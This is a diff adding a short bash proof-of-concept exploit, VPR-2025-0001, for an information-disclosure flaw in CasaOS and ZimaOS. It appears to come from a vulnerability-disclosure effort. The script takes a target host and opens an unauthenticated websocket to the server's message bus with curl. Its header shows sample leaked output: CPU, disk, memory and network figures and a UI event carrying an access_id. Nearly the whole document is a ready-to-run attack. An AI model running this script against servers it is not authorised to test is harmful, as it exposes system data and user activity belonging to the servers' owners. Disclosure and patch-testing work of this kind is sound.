@@ -1,0 +1,81 @@
+#!/usr/bin/env bash
+
+# Script:           VPR-2025-0001
+# Affects:          CasaOS <= 0.4.15, ZimaOS <= v1.4.1
+# Purpose:          Information Disclosure
+# Description:      Leaks information and user actions via manual websocket connections to a CasaOS server.
+
+# Created by:       VPR
+# Created:          April 20th, 2025
+
+# Updated by:       VPR
+# Updated:          June 24th, 2025
+
+# Example Output:   0
+#                   {
+#                     "sid": "3q",
+#                     "upgrades": [
+#                       "polling"
+#                     ],
+#                     "pingInterval": 20000,
+#                     "pingTimeout": 60000
+#                   }
+#                   4042
+#                   [
+#                     "casaos:system:utilization",
+#                     {
+#                       "ID": 0,
+#                       "SourceID": "casaos",
+#                       "Name": "casaos:system:utilization",
+#                       "Properties": {
+#                         "sys_cpu": "{\"model\":\"intel\",\"num\":2,\"percent\":4.1,\"power\":{\"timestamp\":\"1750809949\",\"value\":\"0\"},\"temperature\":0}",
+#                         "sys_disk": "{\"avail\":68470882304,\"health\":true,\"size\":84294823936,\"used\":12292087808}",
+#                         "sys_mem": "{\"available\":2270167040,\"free\":141099008,\"total\":4138708992,\"used\":1471340544,\"usedPercent\":35.6}",
+#                         "sys_net": "[{\"name\":\"eth0\",\"bytesSent\":316005907,\"bytesRecv\":1619100214,\"packetsSent\":276387,\"packetsRecv\":1347934,\"errin\":0,\"errout\":0,\"dropin\":0,\"dropout\":0,\"fifoin\":0,\"fifoout\":0,\"state\":\"up\",\"time\":1750809949}]",
+#                         "sys_usb": "[]"
+#                       },
+#                       "Timestamp": 1750809949,
+#                       "uuid": "80813d88-37e6-4119-913d-60959b2c1690"
+#                     }
+#                   ]
+#                   42
+#                   [
+#                     "casaos-ui:widget:widget_widgetsetting",
+#                     {
+#                       "ID": 0,
+#                       "SourceID": "casaos-ui",
+#                       "Name": "casaos-ui:widget:widget_widgetsetting",
+#                       "Properties": {
+#                         "access_id": "O1tNAbz3ny_vV0iG-q1hH",
+#                         "casaos_lang": "en_us",
+#                         "device_id": "xxx"
+#                       },
+#                       "Timestamp": 1750809950,
+#                       "uuid": "3a71a980-4b18-4153-9ce5-38a58c92c70b"
+#                     }
+#                   ]
+
+
+printf \
+"
+ _             _  _  _  _  _  _    _  _  _  _  _
+(_)           (_)(_)(_)(_)(_)(_)_ (_)(_)(_)(_)(_) _
+ (_)         (_) (_)           (_)(_)            (_)
+  (_)       (_)  (_) _  _  _  _(_)(_) _  _  _  _ (_)
+   (_)     (_)   (_)(_)(_)(_)(_)  (_)(_)(_)(_)(_)
+    (_)   (_)    (_)              (_)   (_) _
+     (_)_(_)     (_)              (_)      (_) _
+       (_)       (_)              (_)         (_) _
+                                                 (_) _
+                                                    (_)
+"
+
+DEFAULT_HOST="127.0.0.1"
+HOST="${1:-${DEFAULT_HOST}}"
+API="/v2/message_bus/socket.io"
+PARAMS="?EIO=4&transport=websocket"
+
+curl -vk \
+  -H "Connection: Upgrade" \
+  -H "Upgrade: websocket" \
+  "ws://${HOST}${API}${PARAMS}" 
